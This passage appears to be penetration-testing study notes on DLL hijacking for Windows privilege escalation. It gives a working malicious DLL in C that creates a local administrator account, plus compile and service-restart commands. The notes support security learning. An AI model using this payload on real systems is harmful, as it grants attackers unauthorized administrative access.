DLL are the specular 'Shared Object' on Linux. They are libraries that provide functionalities for executable programs. With the program [Process Monitor](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) we can monitor program calls. If we find that a program calls a DLL that is missing, it may be replaced (if we have the correct read/write permissions) by our malicious DLL. We can craft the DLL following [Microsoft's guidelines](https://learn.microsoft.com/it-it/troubleshoot/windows-client/deployment/dynamic-link-library) and insert into the case `DLL_PROCESS_ATTACHED` our code. The code can be similar to the previous code for the manual privilege escalation using Windows services.

This is the order Windows search for DLLs

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

The following C program can be used to exploit a missing DLL

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int payload;
        payload = system ("net user john Password123! /add");
        payload = system ("net localgroup administrators john /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

We will then compile it on the Linux machine with the `--shared` option and we load it in the Windows machine **in the path and with the name that Windows expect the DLL to have**. Obviously this works only if we have the **WRITE** permission on that files.

```shell
x86_64-w64-mingw32-gcc calledDll.cpp --shared -o calledDll.dll
```

Transfer the file and restart the service with

```powershell
Restart-Service <SERVICENAME>
```

And we will be able to execute a shell as admin with the user john. We could not be able to log-in via RDP because the user may not be in the RDP group.